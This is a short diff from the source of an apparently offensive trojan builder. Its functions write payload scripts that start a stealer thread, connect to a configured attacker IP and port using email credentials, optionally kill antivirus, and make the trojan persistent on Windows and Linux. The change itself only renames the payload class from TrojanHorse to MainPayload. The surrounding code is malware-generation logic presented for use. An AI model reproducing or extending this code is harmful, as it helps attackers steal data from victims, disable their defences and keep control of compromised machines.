@@ -124,7 +124,7 @@ def create_trojan(file_name, email, password, ip, port, time_persistent, legitim
             file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
             file.write(f"\t\tt2.start()\n\n")                           #Starting Thread        
 
-        file.write(f"\t\ttHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
+        file.write(f"\t\ttHorse = payload.MainPayload(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
         if arguments.kill_av != None and arguments.kill_av != "":
             file.write(f"\t\ttHorse.kill_av({arguments.kill_av})\n") 
         else:
@@ -137,7 +137,7 @@ def create_trojan_linux(file_name, email, password, ip, port, time_persistent):
     with open(file_name, "w+") as file:
         file.write("import payload\n")
         
-        file.write(f"tHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
+        file.write(f"tHorse = payload.MainPayload(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
         file.write(f"tHorse.become_persistent({time_persistent})\n") 
         file.write("tHorse.start()\n\n")     
                 
